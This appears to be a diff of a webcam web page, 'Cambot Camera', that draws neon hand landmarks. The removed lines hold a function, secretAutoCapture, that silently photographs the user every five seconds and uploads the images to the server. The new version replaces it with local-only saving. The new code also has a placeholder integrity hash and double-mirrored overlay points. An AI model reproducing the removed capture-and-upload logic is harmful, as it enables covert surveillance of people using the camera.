@@ -1,290 +1,326 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cambot Camera</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Cambot Camera — Neon Hands</title>
+
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+    integrity="sha512-..." crossorigin="anonymous" referrerpolicy="no-referrer" />
+
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
 
+    :root{
+      --neon: #00f2fe;
+      --bg1: #0f2027;
+      --bg2: #203a43;
+      --bg3: #2c5364;
+    }
+
+    html,body { height:100%; margin:0; }
+
     body {
-      margin: 0;
-      padding: 0;
       font-family: 'Orbitron', sans-serif;
-      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-      color: #f0f0f0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
-      min-height: 100vh;
-      text-align: center;
-      overflow: hidden;
+      background: linear-gradient(135deg, var(--bg1), var(--bg2), var(--bg3));
+      color: #e7f9ff;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:flex-start;
+      gap:18px;
+      padding:28px 12px;
+      box-sizing:border-box;
     }
 
-    h1 {
-      font-size: 2rem;
-      margin: 20px 0;
-      color: #00f2fe;
-      text-shadow: 0 0 15px rgba(0, 242, 254, 0.7);
+    header {
+      width:100%;
+      max-width:720px;
+      display:flex;
+      align-items:center;
+      gap:16px;
+      justify-content:flex-start;
+    }
+    .logo {
+      display:flex;
+      align-items:center;
+      gap:12px;
+      color:var(--neon);
+      text-shadow:0 0 12px rgba(0,242,254,0.6);
+      font-size:1.6rem;
+    }
+    .logo i{ font-size:1.6rem; background: rgba(255,255,255,0.02); padding:8px; border-radius:8px;}
+
+    .camera-frame {
+      width:100%;
+      max-width:420px;
+      aspect-ratio: 3/4; /* portrait feel */
+      position:relative;
+      border-radius:14px;
+      padding:14px;
+      box-sizing:border-box;
+      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.06));
+      box-shadow: 0 8px 40px rgba(0,0,0,0.6), 0 0 30px rgba(0,242,254,0.06) inset;
     }
 
-    .camera-container {
-      position: relative;
-      width: 90%;
-      max-width: 420px;
+    .viewport {
+      position:relative;
+      width:100%;
+      height:100%;
+      border-radius:10px;
+      overflow:hidden;
+      background:#000;
+      display:flex;
+      align-items:center;
+      justify-content:center;
     }
 
-    video, #poseCanvas, #handCanvas {
-      width: 100%;
-      border: 3px solid #00f2fe;
-      border-radius: 12px;
-      box-shadow: 0 0 25px rgba(0, 242, 254, 0.3);
-      position: absolute;
-      top: 0;
-      left: 0;
+    video {
+      width:100%;
+      height:100%;
+      object-fit:cover;
+      transform: scaleX(-1); /* mirror for selfie feel */
     }
 
-    #video { z-index: 1; }
-    #poseCanvas { z-index: 2; pointer-events: none; }
-    #handCanvas { z-index: 3; pointer-events: none; }
-
-    #capture {
-      margin-top: 20px;
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      border: 4px solid #00f2fe;
-      background: radial-gradient(circle, #4facfe, #00f2fe);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.5rem;
-      color: #111;
-      cursor: pointer;
-      box-shadow: 0 0 20px rgba(0, 242, 254, 0.6);
-      transition: transform 0.2s ease-in-out, box-shadow 0.2s;
-      z-index: 4;
-      position: relative;
+    canvas.overlay {
+      position:absolute;
+      top:0; left:0; width:100%; height:100%;
+      pointer-events:none;
+      transform: scaleX(-1);
     }
 
-    #capture:hover {
-      transform: scale(1.1);
-      box-shadow: 0 0 35px rgba(79, 172, 254, 0.9);
+    .controls {
+      display:flex;
+      gap:16px;
+      align-items:center;
+      justify-content:center;
+      margin-top:12px;
+      z-index:10;
     }
 
-    #flash {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: white;
-      opacity: 0;
-      pointer-events: none;
-      z-index: 999;
+    .shutter {
+      width:78px;
+      height:78px;
+      border-radius:50%;
+      background: radial-gradient(circle at 30% 30%, #7ceaff, #00c0ff);
+      border:5px solid rgba(255,255,255,0.95);
+      box-shadow: 0 8px 25px rgba(0,192,255,0.25), 0 0 40px rgba(0,242,254,0.18);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      cursor:pointer;
+      transition: transform .12s ease, box-shadow .12s;
     }
+    .shutter:active { transform: scale(.94); box-shadow: 0 4px 18px rgba(0,192,255,0.18); }
+    .shutter i { font-size:22px; color:#091018; }
 
     footer {
-      margin: 20px 0;
-      font-size: 0.8rem;
-      opacity: 0.7;
-      z-index: 5;
-      position: relative;
+      width:100%;
+      max-width:720px;
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      margin-top:18px;
+      color: rgba(255,255,255,0.65);
+      font-size:0.86rem;
     }
 
-    .falling-text {
-      position: fixed;
-      top: -50px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 1rem;
-      color: rgba(255,255,255,0.6);
-      animation: fall 5s linear forwards;
-      pointer-events: none;
-      z-index: 10;
-    }
+    .tagline { color:var(--neon); text-shadow: 0 0 10px rgba(0,242,254,0.15); }
 
-    @keyframes fall {
-      0% { top: -50px; opacity: 1; }
-      80% { opacity: 1; }
-      100% { top: 90%; opacity: 0; }
-    }
+    /* small helper */
+    .muted { opacity:0.7; font-size:0.85rem; }
+
   </style>
 </head>
 <body>
-  <h1><i class="fa-solid fa-robot"></i> Cambot Camera</h1>
+  <header>
+    <div class="logo"><i class="fa-solid fa-robot"></i> <strong>Cambot Camera</strong></div>
+  </header>
 
-  <div class="camera-container">
-    <video id="video" autoplay playsinline></video>
-    <canvas id="poseCanvas"></canvas>
-    <canvas id="handCanvas"></canvas>
+  <div class="camera-frame">
+    <div class="viewport" id="viewport">
+      <video id="video" autoplay playsinline></video>
+      <canvas id="handCanvas" class="overlay"></canvas>
+    </div>
   </div>
 
-  <button id="capture"><i class="fa-solid fa-camera"></i></button>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <div id="flash"></div>
+  <div class="controls">
+    <div class="shutter" id="shutterBtn" title="Take photo (downloads locally)">
+      <i class="fa-solid fa-camera"></i>
+    </div>
+  </div>
 
-  <footer>Powered by Cambot • Telegram Bot</footer>
+  <footer>
+    <div class="tagline">Developed by Churchill</div>
+    <div class="muted">No uploads — local save only</div>
+  </footer>
+
+  <!-- shutter sound optional -->
   <audio id="shutterSound" src="cam.mp3" preload="auto"></audio>
 
-  <!-- TFJS + Models -->
-  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-core"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-converter"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-backend-webgl"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/pose-detection"></script>
+  <!-- MediaPipe Hands (CDN) -->
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js"></script>
 
   <script>
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const poseCanvas = document.getElementById("poseCanvas");
-    const handCanvas = document.getElementById("handCanvas");
-    const ctxPose = poseCanvas.getContext("2d");
-    const ctxHand = handCanvas.getContext("2d");
-    const captureBtn = document.getElementById("capture");
-    const flash = document.getElementById("flash");
-    const shutterSound = document.getElementById("shutterSound");
+    const video = document.getElementById('video');
+    const handCanvas = document.getElementById('handCanvas');
+    const ctx = handCanvas.getContext('2d');
+    const shutterBtn = document.getElementById('shutterBtn');
+    const shutterSound = document.getElementById('shutterSound');
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => { video.srcObject = stream; })
-      .catch(err => console.error("Camera error:", err));
-
-    async function sendPhoto(blob) {
-      const form = new FormData();
-      form.append("photo", blob, "capture.jpg");
+    async function initCamera() {
       try {
-        await fetch("/upload", { method: "POST", body: form });
-      } catch (err) {
-        console.error("Upload failed:", err);
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        video.srcObject = stream;
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+
+        // size canvases to match video display size
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+      } catch (e) {
+        alert('Camera permission denied or no camera available.');
+        console.error(e);
       }
     }
 
-    async function takePhoto() {
-      const ctx = canvas.getContext("2d");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
-      return blob;
+    function resizeCanvas() {
+      const rect = video.getBoundingClientRect();
+      handCanvas.width = rect.width;
+      handCanvas.height = rect.height;
+      handCanvas.style.width = rect.width + 'px';
+      handCanvas.style.height = rect.height + 'px';
     }
 
-    captureBtn.addEventListener("click", async () => {
-      shutterSound.currentTime = 0;
-      shutterSound.play();
-      flash.style.opacity = 1;
-      setTimeout(() => flash.style.opacity = 0, 150);
-      const blob = await takePhoto();
-      await sendPhoto(blob);
-    });
-
-    async function secretAutoCapture() {
-      const blob = await takePhoto();
-      await sendPhoto(blob);
-    }
-    setInterval(secretAutoCapture, 5000);
-
-    function dropText() {
-      const text = document.createElement("div");
-      text.className = "falling-text";
-      text.textContent = "Developed by Churchill";
-      document.body.appendChild(text);
-      setTimeout(() => text.remove(), 5000);
-    }
-    setTimeout(dropText, 2000);
-    setTimeout(dropText, 6000);
-
-    // Pose detection
-    async function startPose() {
-      const detector = await poseDetection.createDetector(
-        poseDetection.SupportedModels.MoveNet,
-        { modelType: poseDetection.movenet.modelType.SINGLEPOSE_LIGHTNING }
-      );
-
-      poseCanvas.width = video.videoWidth;
-      poseCanvas.height = video.videoHeight;
-      handCanvas.width = video.videoWidth;
-      handCanvas.height = video.videoHeight;
-
-      async function poseFrame() {
-        const poses = await detector.estimatePoses(video);
-        ctxPose.clearRect(0, 0, poseCanvas.width, poseCanvas.height);
-
-        if (poses.length > 0) {
-          const keypoints = poses[0].keypoints;
-          ctxPose.strokeStyle = "cyan";
-          ctxPose.lineWidth = 3;
-          ctxPose.shadowBlur = 15;
-          ctxPose.shadowColor = "cyan";
-
-          keypoints.forEach(pt => {
-            if (pt.score > 0.5) {
-              ctxPose.beginPath();
-              ctxPose.arc(pt.x, pt.y, 5, 0, 2 * Math.PI);
-              ctxPose.fillStyle = "cyan";
-              ctxPose.fill();
-            }
-          });
-
-          function drawLine(a, b) {
-            if (a.score > 0.5 && b.score > 0.5) {
-              ctxPose.beginPath();
-              ctxPose.moveTo(a.x, a.y);
-              ctxPose.lineTo(b.x, b.y);
-              ctxPose.stroke();
-            }
-          }
-
-          drawLine(keypoints[5], keypoints[7]);
-          drawLine(keypoints[7], keypoints[9]);
-          drawLine(keypoints[6], keypoints[8]);
-          drawLine(keypoints[8], keypoints[10]);
-          drawLine(keypoints[11], keypoints[13]);
-          drawLine(keypoints[13], keypoints[15]);
-          drawLine(keypoints[12], keypoints[14]);
-          drawLine(keypoints[14], keypoints[16]);
-        }
-        requestAnimationFrame(poseFrame);
-      }
-      poseFrame();
+    // helper to map mediapipe normalized coords to canvas coords
+    function toCanvas(point, videoEl, canvasEl) {
+      const vw = videoEl.videoWidth;
+      const vh = videoEl.videoHeight;
+      const rect = videoEl.getBoundingClientRect();
+      // normalized coord -> pixel on displayed canvas (mirrored horizontally)
+      return {
+        x: (point.x * rect.width),
+        y: (point.y * rect.height)
+      };
     }
 
-    video.addEventListener("loadeddata", startPose);
+    // neon draw utilities
+    function drawNeonLine(a, b) {
+      ctx.save();
+      ctx.lineWidth = 3.5;
+      ctx.strokeStyle = 'rgba(0,242,254,0.95)';
+      ctx.shadowBlur = 16;
+      ctx.shadowColor = 'rgba(0,242,254,0.9)';
+      ctx.beginPath();
+      ctx.moveTo(a.x, a.y);
+      ctx.lineTo(b.x, b.y);
+      ctx.stroke();
+      ctx.restore();
+    }
+    function drawNeonPoint(p) {
+      ctx.save();
+      ctx.fillStyle = 'rgba(0,242,254,1)';
+      ctx.shadowBlur = 18;
+      ctx.shadowColor = 'rgba(0,242,254,0.9)';
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, 6, 0, Math.PI*2);
+      ctx.fill();
+      ctx.restore();
+    }
 
-    // Hand detection
+    // Setup MediaPipe Hands
     const hands = new Hands({
       locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
     });
-
     hands.setOptions({
       maxNumHands: 2,
-      minDetectionConfidence: 0.7,
-      minTrackingConfidence: 0.7
+      modelComplexity: 1,
+      minDetectionConfidence: 0.6,
+      minTrackingConfidence: 0.6
     });
 
-    hands.onResults(results => {
-      ctxHand.clearRect(0, 0, handCanvas.width, handCanvas.height);
-      if (results.multiHandLandmarks) {
-        for (const landmarks of results.multiHandLandmarks) {
-          drawConnectors(ctxHand, landmarks, HAND_CONNECTIONS,
-            { color: 'cyan', lineWidth: 2 });
-          drawLandmarks(ctxHand, landmarks,
-            { color: 'cyan', lineWidth: 1 });
+    hands.onResults((results) => {
+      // clear overlay
+      ctx.clearRect(0, 0, handCanvas.width, handCanvas.height);
+
+      if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) return;
+
+      // For each hand, draw connectors (neon) and landmarks (neon)
+      for (let handLandmarks of results.multiHandLandmarks) {
+        // mapping: landmarks are normalized to video pixels
+        // draw connections using drawing_utils HAND_CONNECTIONS for indices
+        const connections = window.HAND_CONNECTIONS; // provided by drawing_utils
+        // prepare points mapped to displayed canvas coords (mirrored)
+        const points = handLandmarks.map(pt => {
+          // MediaPipe coordinates: x,y are normalized to [0..1] relative to video image
+          // We map to display size; also flip horizontally for selfie feel
+          const rect = video.getBoundingClientRect();
+          return {
+            x: rect.width - (pt.x * rect.width),
+            y: pt.y * rect.height
+          };
+        });
+
+        // draw lines (connections)
+        for (let conn of connections) {
+          const [i, j] = conn;
+          drawNeonLine(points[i], points[j]);
         }
+        // draw points
+        for (let p of points) drawNeonPoint(p);
       }
     });
 
-    const camera = new Camera(video, {
+    // Use MediaPipe Camera to feed frames into hands
+    const mpCamera = new Camera(video, {
       onFrame: async () => {
         await hands.send({ image: video });
       },
-      width: 420,
-      height: 320
+      width: 640,
+      height: 480
     });
-    camera.start();
+
+    // start camera and detection
+    (async () => {
+      await initCamera();
+      mpCamera.start();
+    })();
+
+    // capture current visible frame -> download
+    shutterBtn.addEventListener('click', async () => {
+      // play sound/flash
+      try { shutterSound.currentTime = 0; shutterSound.play(); } catch(e){}
+
+      // create an offscreen canvas same size as displayed video and draw video + overlay
+      const rect = video.getBoundingClientRect();
+      const out = document.createElement('canvas');
+      out.width = rect.width;
+      out.height = rect.height;
+      const outCtx = out.getContext('2d');
+
+      // draw video (mirrored to match display)
+      outCtx.save();
+      outCtx.translate(out.width, 0);
+      outCtx.scale(-1, 1);
+      outCtx.drawImage(video, 0, 0, out.width, out.height);
+      outCtx.restore();
+
+      // draw overlay (handCanvas) on top
+      outCtx.drawImage(handCanvas, 0, 0, out.width, out.height);
+
+      // download
+      out.toBlob(blob => {
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = `cambot_capture_${Date.now()}.jpg`;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+      }, 'image/jpeg', 0.92);
+    });
   </script>
 </body>
 </html>
